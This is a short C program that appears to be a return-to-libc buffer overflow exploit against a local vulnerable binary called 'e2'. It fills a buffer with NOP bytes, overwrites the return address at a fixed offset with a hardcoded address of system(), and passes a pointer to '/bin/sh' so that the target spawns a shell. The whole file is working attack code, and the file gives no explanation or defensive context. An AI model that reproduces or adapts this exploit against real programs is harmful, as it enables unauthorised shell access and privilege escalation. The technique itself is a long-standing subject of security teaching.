#include <stdio.h>

#define RET_POSITION                     260
#define NOP                            0x90
#define BUFADDR                         0xbffff978//0xbffff968
#define SYSTEM                  0x40058ae0
char shell[]="/bin/sh";                      /* .string \"/bin/sh\"   */

int main(int argc,char **argv)
{
        char buff[1024],*ptr;
        int retaddr;
        int i;

        retaddr=SYSTEM;
        if(argc>1)
                retaddr=SYSTEM+atoi(argv[1]);

        bzero(buff,1024);
        for(i=0;i<300;i++)
                buff[i]=NOP;
        *((long *)&(buff[RET_POSITION-4]))=BUFADDR+4*3+strlen(shell);
        *((long *)&(buff[RET_POSITION]))=retaddr;
        *((long *)&(buff[RET_POSITION+4]))=0xaabbccdd;//当system返回时候的eip
        *((long *)&(buff[RET_POSITION+8]))=BUFADDR+RET_POSITION+4*3;
        ptr=buff+RET_POSITION+12;
        strcpy(ptr,shell);
        printf("Jump to 0x%08x\n",retaddr);

        execl("./e2","e2",buff,0);
}
